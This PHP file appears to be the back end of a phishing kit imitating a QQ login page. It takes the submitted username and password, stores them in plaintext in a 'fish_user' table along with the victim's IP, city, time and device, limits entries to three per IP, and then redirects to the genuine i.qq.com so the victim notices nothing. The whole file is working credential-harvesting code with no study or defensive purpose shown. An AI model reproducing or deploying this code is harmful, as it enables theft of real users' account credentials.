<?php

require_once './include/common.php';

$realip=real_ip();

$ipcount=$DB->count("SELECT count(*) from fish_user where ip='$realip'");

if($ipcount<3){

$username=daddslashes($_POST['user']);

$password=daddslashes($_POST['pass']);

$address=getCity($realip);

$time=date("Y-m-d H:i:s");

$ua=$_SERVER['HTTP_USER_AGENT'];

$device=get_device($ua);

$sql="INSERT INTO `fish_user`(`username`, `password`, `ip`, `address`, `time`, `device`) VALUES ('{$username}','{$password}','{$realip}','{$address}','{$time}','{$device}')";

$DB->query($sql);

//在这里他完成写文件之后进行跳转

header("Location: https://i.qq.com/?rd=".$username);

}

else

{

//在这里他完成写文件之后进行跳转

header("Location: https://i.qq.com/?rd=".$username);

}

?>
